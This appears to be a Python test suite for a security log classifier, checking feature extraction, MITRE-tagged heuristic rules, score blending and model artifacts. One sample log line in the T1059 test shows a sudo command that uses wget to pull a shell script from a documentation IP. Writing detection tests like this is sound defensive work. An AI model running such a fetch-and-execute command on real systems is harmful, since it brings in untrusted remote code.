"""Suite 52 — LOG-ML-P2: log features, heuristic layer, baseline model, blend.

Mirrors backend/tests/test_log_ml.py (pytest) as runner assertions so the
canonical run_all_tests.py count includes this phase.
"""

import json
from pathlib import Path

import joblib

from app.services.log_blend import blend_scores
from app.services.log_features import (
    LABELS,
    NUMERIC_FEATURES,
    extract_features,
    extract_source_entities,
    group_split,
    ngram_text,
    tokenize,
    vectorize_batch,
)
from app.services.log_heuristic import classify_heuristic

MODELS_DIR = Path(__file__).resolve().parents[1] / "models"
PKL_PATH = MODELS_DIR / "log_threat_v1.pkl"
MANIFEST_PATH = MODELS_DIR / "log_threat_v1_features.json"


def run_log_ml_tests(runner) -> None:
    # 1. tokenization + normalization
    tokens = tokenize("Failed password for deploy from 183.62.140.253 port 49870 ssh2")
    normalized = ngram_text("Failed password for root from 183.62.140.253 blk_-1608999687919862906 22")
    runner.assert_true(
        "183.62.140.253" in tokens and "deploy" in tokens and "49870" in tokens
        and "<ip>" in normalized and "<blk>" in normalized and "<num>" in normalized
        and "failed" in normalized and "183" not in normalized,
        "tokenization keeps IPs/usernames; normalization masks literals",
    )

    # 2. structural features
    feats = extract_features("Failed password for invalid user admin from 203.0.113.7 port 41000 ssh2")
    runner.assert_true(
        all(n in feats for n in NUMERIC_FEATURES)
        and feats["has_ip"] == 1 and feats["has_port"] == 1 and feats["has_username"] == 1,
        "structural features: has_ip/has_port/has_username + full numeric set",
    )

    # 3. temporal features
    iso = extract_features("2008-11-09T20:35:18 Receiving block blk_-1608999687919862906")
    syslog = extract_features("Jun 14 15:16:01 combo sshd(pam_unix): authentication failure")
    no_ts = extract_features("instruction cache parity error corrected")
    runner.assert_true(
        iso["hour_of_day"] == 20 and iso["day_of_week"] == 6
        and syslog["hour_of_day"] == 15
        and no_ts["hour_of_day"] == -1 and no_ts["day_of_week"] == -1,
        "temporal features: ISO + syslog hour/day parsed; absent -> -1",
    )

    # 4. source-specific entities
    hdfs = extract_source_entities("Receiving block blk_-2126554733521224025 src: /10.251.199.86:42666", "loghub_hdfs")
    bgl = extract_source_entities("R02-M1-N0-C:J12-U11 instruction cache parity error corrected", "loghub_bgl")
    adfa = extract_source_entities("6 91 11 45 221 221 33", "adfa_ld")
    runner.assert_true(
        hdfs["hdfs_block_id"] == "blk_-2126554733521224025" and hdfs["ip"] == "10.251.199.86"
        and bgl["bgl_node"] == "R02-M1-N0-C:J12-U11"
        and adfa["syscalls"] == [6, 91, 11, 45, 221, 221, 33],
        "source entities: HDFS block id, BGL node id, ADFA syscall sequence",
    )

    # 5. vectorization (sparse, 1-2 grams, numeric names appended)
    lines = [
        "Failed password for root from 203.0.113.7 port 41000 ssh2",
        "Failed password for deploy from 198.51.100.9 port 41001 ssh2",
        "PacketResponder 1 for block blk_-1608999687919862906 terminating",
        "Receiving block blk_-1608999687919862906 src: /10.251.31.15:54106",
    ]
    sources = ["loghub_openssh"] * 2 + ["loghub_hdfs"] * 2
    matrix, names = vectorize_batch(lines, sources)
    from scipy.sparse import issparse

    runner.assert_true(
        issparse(matrix) and matrix.shape[0] == 4 and matrix.shape[1] == len(names)
        and all(n in names for n in NUMERIC_FEATURES) and "failed password" in names,
        "vectorize_batch: sparse matrix, numeric names appended, bigrams kept",
    )

    # 6. grouped split atomicity
    keys = [f"blk_{i}" for i in range(100)] * 2
    train, val, test = group_split(keys, (0.6, 0.2, 0.2), seed=7)
    runner.assert_true(
        not (train & val or train & test or val & test)
        and len(train) + len(val) + len(test) == 100
        and abs(len(train) / 100 - 0.6) < 0.05,
        "group_split: keys never straddle partitions; ratio approx 60/20/20",
    )

    # 7. T1110
    res = classify_heuristic("Mar 10 03:12:09 srv-auth01 sshd[4242]: Failed password for root from 198.51.100.9 port 50001 ssh2")
    values = {i["type"]: i["value"] for i in res["indicators"]}
    runner.assert_true(
        res["severity"] == "high" and res["mitre"] == ["T1110"]
        and values["source_ip"] == "198.51.100.9" and values["username"] == "root",
        "heuristic T1110: failed password -> high + ip/username indicators",
    )

    # 8. T1078
    ext = classify_heuristic("Mar 10 03:12:44 srv-auth01 sshd[4243]: Accepted password for deploy from 198.51.100.9 port 50002 ssh2")
    priv = classify_heuristic("Accepted publickey for deploy from 10.0.2.5 port 41000 ssh2")
    runner.assert_true(
        ext["severity"] == "medium" and ext["mitre"] == ["T1078"]
        and priv["severity"] == "info" and priv["mitre"] == [],
        "heuristic T1078: external successful login -> medium; private source -> info",
    )

    # 9. T1548
    sudo = classify_heuristic("Mar 10 04:00:01 srv-auth01 sudo: backup : 3 incorrect password attempts ; USER=root ; COMMAND=/bin/bash")
    su = classify_heuristic("Mar 10 04:01:00 srv-auth01 su: FAILED SU (to root) backup on pts/2")
    runner.assert_true(
        sudo["severity"] == "high" and sudo["mitre"] == ["T1548"]
        and su["severity"] == "high" and su["mitre"] == ["T1548"],
        "heuristic T1548: sudo incorrect-password and FAILED SU -> high",
    )

    # 10. T1059
    cmd = classify_heuristic("Mar 10 04:00:02 srv-auth01 sudo: deploy : TTY=pts/0 ; USER=root ; COMMAND=/bin/sh -c wget http://203.0.113.5/x.sh")
    cmd_values = {i["type"]: i["value"] for i in cmd["indicators"]}
    runner.assert_true(
        cmd["severity"] == "medium" and cmd["mitre"] == ["T1059"] and "wget" in cmd_values["command"],
        "heuristic T1059: sudo COMMAND= -> medium with command indicator",
    )

    # 11. operational anomalies + default
    low = classify_heuristic("instruction cache parity error corrected")
    info = classify_heuristic("connection from 206.47.209.10 () at Mon Jul 25 06:39:18 2005")
    runner.assert_true(
        low["severity"] == "low" and low["mitre"] == []
        and info["severity"] == "info" and info["indicators"] == [],
        "heuristic: operational anomalies -> low; unmatched line -> info",
    )

    # 12. blend: strong heuristic never lowered
    runner.assert_true(
        blend_scores("high", 0.05) == {"risk_score": 80, "severity": "high"}
        and blend_scores("critical", 0.40) == {"risk_score": 95, "severity": "critical"}
        and blend_scores("high", 0.99) == {"risk_score": 99, "severity": "high"},
        "blend: high/critical severity held; ML only raises risk_score",
    )

    # 13. blend: weak heuristic raised by ML
    raised = True
    try:
        blend_scores("bogus", 0.5)
        raised = False
    except ValueError:
        pass
    runner.assert_true(
        blend_scores("info", 0.85) == {"risk_score": 85, "severity": "high"}
        and blend_scores("low", 0.97) == {"risk_score": 97, "severity": "critical"}
        and blend_scores("info", 0.30) == {"risk_score": 30, "severity": "low"}
        and blend_scores("medium", 0.60) == {"risk_score": 60, "severity": "medium"}
        and raised,
        "blend: weak severity raised at ml>0.8 (>0.95 -> critical); ValueError on bad severity",
    )

    # 14. model artifacts + manifest
    if not PKL_PATH.exists() or not MANIFEST_PATH.exists():
        runner.skip("model artifacts present", "run scripts/train_log_model_v1.py first")
        return
    manifest = json.loads(MANIFEST_PATH.read_text())
    bundle = joblib.load(PKL_PATH)
    runner.assert_true(
        manifest["version"] == "log_threat_v1"
        and manifest["metrics"]["macro_f1"] > 0.7
        and manifest["split"]["grouped"] is True and manifest["split"]["key"] == "split_key"
        and manifest["n_features_total"] == manifest["n_text_features"] + len(NUMERIC_FEATURES)
        and bundle["labels"] == LABELS and bundle["version"] == "log_threat_v1"
        and 0.05 < PKL_PATH.stat().st_size / 1e6 < 50,
        "log_threat_v1.pkl + manifest: macro_f1>0.7, grouped split, feature count, bundle labels",
    )

    # 15. eval harness on 10 curated samples
    import sys

    sys.path.insert(0, str(Path(__file__).resolve().parents[2] / "scripts"))
    from train_log_model_v1 import EVAL_SAMPLES, evaluate_bundle

    results = evaluate_bundle(bundle, EVAL_SAMPLES)
    exact = sum(1 for r in results if r["severity"] == r["expected"])
    runner.assert_true(
        len(results) == 10
        and all(r["severity"] in {"critical", "high", "medium", "low"} for r in results)
        and all(0 <= r["risk_score"] <= 100 for r in results)
        and exact >= 6
        and any(r["mitre"] == ["T1110"] for r in results)
        and any(r["mitre"] == ["T1548"] for r in results),
        f"eval harness: 10 samples predicted, >=6 exact severities (got {exact}/10), MITRE preserved",
    )
